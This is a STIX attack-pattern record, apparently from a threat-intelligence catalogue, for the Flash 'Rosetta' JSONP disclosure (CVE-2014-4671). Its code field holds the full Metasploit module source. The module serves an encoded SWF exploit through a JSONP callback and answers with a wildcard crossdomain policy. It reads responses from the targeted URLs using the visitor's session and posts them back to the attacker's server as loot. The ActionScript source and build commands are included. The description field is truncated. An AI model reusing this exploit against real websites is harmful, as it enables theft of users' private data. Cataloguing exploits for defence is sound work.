{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2c39ae9d-1625-46f6-80fd-f0d745a05b8b",
    "created": "2024-08-14T16:31:54.191701Z",
    "modified": "2024-08-14T16:31:54.191705Z",
    "name": "Flash \"Rosetta\" JSONP GET/POST Response Disclosure",
    "description": " A website that serves a JSONP endpoint that accepts a custom alphanumeric callback of 1200 chars can be abused to serve an encoded swf payload that",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/flash_rosetta_jsonp_url_disclosure.rb",
            "external_id": "flash_rosetta_jsonp_url_disclosure.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-4671"
        },
        {
            "source_name": "reference",
            "url": "http://miki.it/blog/2014/7/8/abusing-jsonp-with-rosetta-flash/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/mikispag/rosettaflash"
        },
        {
            "source_name": "reference",
            "url": "https://www.quaxio.com/jsonp_handcrafted_flash_files/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'uri'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Flash \"Rosetta\" JSONP GET/POST Response Disclosure',\n      'Description'    => %q{\n        A website that serves a JSONP endpoint that accepts a custom alphanumeric\n        callback of 1200 chars can be abused to serve an encoded swf payload that\n        steals the contents of a same-domain URL. Flash < 14.0.0.145 is required.\n\n        This module spins up a web server that, upon navigation from a user, attempts\n        to abuse the specified JSONP endpoint URLs by stealing the response from\n        GET requests to STEAL_URLS.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [\n        'Michele Spagnuolo', # discovery, wrote rosetta encoder, disclosure\n        'joev' # metasploit module\n      ],\n      'References'     =>\n        [\n          ['CVE', '2014-4671'],\n          ['URL', 'http://miki.it/blog/2014/7/8/abusing-jsonp-with-rosetta-flash/'],\n          ['URL', 'https://github.com/mikispag/rosettaflash'],\n          ['URL', 'https://www.quaxio.com/jsonp_handcrafted_flash_files/']\n        ],\n      'DisclosureDate' => '2014-07-08',\n      'Actions'        => [[ 'WebServer', 'Description' => 'Serve exploit via web server' ]],\n      'PassiveActions' => [ 'WebServer' ],\n      'DefaultAction'  => 'WebServer'))\n\n    register_options(\n      [\n        OptString.new('CALLBACK', [ true, 'The name of the callback paramater', 'callback' ]),\n        OptString.new('JSONP_URL', [ true, 'The URL of the vulnerable JSONP endpoint', '' ]),\n        OptBool.new('CHECK', [ true, 'Check first that the JSONP endpoint works', true ]),\n        OptString.new('STEAL_URLS', [ true, 'A comma-separated list of URLs to steal', '' ]),\n        OptString.new('URIPATH', [ true, 'The URI path to serve the exploit under', '/' ])\n      ],\n      self.class)\n  end\n\n  def run\n    if datastore['CHECK'] && check == Msf::Exploit::CheckCode::Safe\n      raise \"JSONP endpoint does not allow sufficiently long callback names.\"\n    end\n\n    unless datastore['URIPATH'] == '/'\n      raise \"URIPATH must be set to '/' to intercept crossdomain.xml request.\"\n    end\n\n    exploit\n  end\n\n  def check\n    test_string = Rex::Text.rand_text_alphanumeric(encoded_swf.length)\n    io = URI.parse(exploit_url(test_string)).open\n    if io.read.start_with? test_string\n      Msf::Exploit::CheckCode::Vulnerable\n    else\n      Msf::Exploit::CheckCode::Safe\n    end\n  end\n\n  def on_request_uri(cli, request)\n    vprint_status(\"Request '#{request.method} #{request.uri}'\")\n    if request.uri.end_with? 'crossdomain.xml'\n      print_status \"Responding to crossdomain request..\"\n      send_response(cli, crossdomain_xml, 'Content-type' => 'text/x-cross-domain-policy')\n    elsif request.uri.end_with? '.log'\n      body = URI.decode(request.body)\n      file = store_loot(\n        \"html\", \"text/plain\", cli.peerhost, body, \"flash_jsonp_rosetta\", \"Exfiltrated HTTP response\"\n      )\n      url = body.lines.first.gsub(/.*?=/,'')\n      print_good \"#{body.length} bytes captured from target #{cli.peerhost} on URL:\\n#{url}\"\n      print_good \"Stored in #{file}\"\n    else\n      print_status \"Serving exploit HTML\"\n      send_response_html(cli, exploit_html)\n    end\n  end\n\n  def exploit_url(data_payload)\n    delimiter = if datastore['JSONP_URL'].include?('?') then '&' else '?' end\n    \"#{datastore['JSONP_URL']}#{delimiter}#{datastore['CALLBACK']}=#{data_payload}\"\n  end\n\n  def exploit_html\n    ex_url = URI::DEFAULT_PARSER.escape(get_uri.chomp('/')+'/'+Rex::Text.rand_text_alphanumeric(6+rand(20))+'.log')\n    %Q|\n      <!doctype html>\n      <html>\n        <body>\n          <object type=\"application/x-shockwave-flash\" data=\"#{exploit_url(encoded_swf)}\"\n            width=500 height=500>\n            <param name=\"FlashVars\"\n              value=\"url=#{URI::DEFAULT_PARSER.escape datastore['STEAL_URLS']}&exfiltrate=#{ex_url}\" />\n          </object>\n        </body>\n      </html>\n    |\n  end\n\n  # Based off of http://miki.it/blog/2014/7/8/abusing-jsonp-with-rosetta-flash/\n  #\n  # Alphanumeric Flash swf applet that steals URLs. Compiled from the following code:\n  #\n  # class X {\n  #   static var app : X;\n  #\n  #   function getURL(url:String) {\n  #     var r:LoadVars = new LoadVars();\n  #     r.onData = function(src:String) {\n  #       if (_root.exfiltrate) {\n  #         var w:LoadVars = new LoadVars();\n  #         w.x = url+\"\\n\"+src;\n  #         w.sendAndLoad(_root.exfiltrate, w, \"POST\");\n  #       }\n  #     }\n  #     r.load(url, r, \"GET\");\n  #   }\n  #\n  #   function X(mc) {\n  #     if (_root.url) {\n  #       var urls:Array = _root.url.split(\",\");\n  #       for (var i in urls) {\n  #         getURL(urls[i]);\n  #       }\n  #     }\n  #   }\n  #\n  #   // entry point\n  #   static function main(mc) {\n  #     app = new X(mc);\n  #   }\n  # }\n  #\n  #\n  #  Compiling the .as using mtasc and swftool:\n  #\n  #  > mtasc.exe -swf out.swf -main -header 800:600:20 exploit.as\n  #  $ swfcombine -d out.swf -o out-uncompressed.swf\n  #  $ rosettaflash --input out-uncompressed.swf --output out-ascii.swf\n  #\n  def encoded_swf\n    \"CWSMIKI0hCD0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7iiudIbEAt333swW0s\" \\\n    \"sG03sDDtDDDt0333333Gt333swwv3wwwFPOHtoHHvwHHFhH3D0Up0IZUnnnnnnnnnnnn\" \\\n    \"nnnnnnnUU5nnnnnn3Snn7YNqdIbeUUUfV13333sDT133333333WEDDT13s03WVqefXAx\" \\\n    \"oookD8f8888T0CiudIbEAt33swwWpt03sDGDDDwwwtttttwwwGDt33333www033333Gf\" \\\n    \"BDRhHHUccUSsgSkKoe5D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7mNqdIbe1\" \\\n    \"WUUfV133sUUpDDUUDDUUDTUEDTEDUTUE0GUUD133333333sUEe1sfzA87TLx888znN8t\" \\\n    \"8F8fV6v0CiudIbEAtwwWDt03sDG0sDtDDDtwwtGwpttGwwt33333333w0333GDfBDFzA\" \\\n    \"HZYqqEHeYAHtHyIAnEHnHNVEJRlHIYqEqEmIVHlqzfjzYyHqQLzEzHVMvnAEYzEVHMHT\" \\\n    \"HbB2D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7CiudIbEAtwuDtDtDDtpDGpD\" \\\n    \"DG0sDtwtwDDGDGtGpDDGwG33sptDDDtGDD33333s03sdFPZHyVQflQfrqzfHRBZHAqzf\" \\\n    \"HaznQHzIIHljjVEJYqIbAzvyHwXHDHtTToXHGhwXHDhtwXHDHWdHHhHxLHXaFHNHwXHD\" \\\n    \"Xt7D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7iiudIbEAt333wwE0GDtwpDtD\" \\\n    \"DGDGtG033sDDwGpDDGtDt033sDDt3333g3sFPXHLxcZWXHKHGlHLDthHHHLXAGXHLxcG\" \\\n    \"XHLdSkhHxvGXHDxskhHHGhHXCWXHEHGDHLTDHmGDHDxLTAcGlHthHHHDhLtSvgXH7D0U\" \\\n    \"p0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7YNqdIbeV133333333333333333gF03\" \\\n    \"sDeqUfzAoE80CiudIbEAtwwW3sD3w0sDt0wwGDDGpDtptDDtGwwGpDDtDDDGDDD33333\" \\\n    \"sG033gFPHHmODHDHttMWhHhVODHDhtTwBHHhHxUHHksSHoHOTHTHHHHtLuWhHXVODHDX\" \\\n    \"tlwBHHhHDUHXKscHCHOXHtXnOXH4D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn\" \\\n    \"7CiudIbEAtwwuwG333spDtDDGDDDt0333st0GGDDt33333www03sdFPlWJoXHgHOTHTH\" \\\n    \"HHHtLGwhHxfOdHDx4D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7CiudIbEAtu\" \\\n    \"wttD333swG0wDDDw03333sDt33333sG03sDDdFPtdXvwhHdLGwhHxhGWwDHdlxXdhvwh\" \\\n    \"HdTg7D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7CiudIbEAt333swwE03GDtD\" \\\n    \"wG0wpDG03sGDDD33333sw033gFPlHtxHHHDxLrkvKwTHLJDXLxAwlHtxHHHDXLjkvKwD\" \\\n    \"HDHLZWBHHhHxmHXgGHVHwXHLHA7D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7\" \\\n    \"CiudIbEAtsWt3wGww03GDttwtDDtDtwDwGDwGDttDDDwDtwwtG0GDtGpDDt33333www0\" \\\n    \"33GdFPlHLjDXthHHHLHqeeobHthHHHXDhtxHHHLZafHQxQHHHOvHDHyMIuiCyIYEHWSs\" \\\n    \"gHmHKcskHoXHLHwhHHfoXHLhnotHthHHHLXnoXHLxUfH1D0Up0IZUnnnnnnnnnnnnnnn\" \\\n    \"nnnnUU5nnnnnn3SnnwWNqdIbe133333333333333333WfF03sTeqefXA888ooo04Cx9\"\n  end\n\n  def crossdomain_xml\n    %Q|\n      <?xml version=\"1.0\" ?>\n      <cross-domain-policy>\n      <allow-access-from domain=\"*\" />\n      </cross-domain-policy>\n    |\n  end\n\n  def rhost\n    URI.parse(datastore[\"JSONP_URL\"]).host\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2014-07-08"
}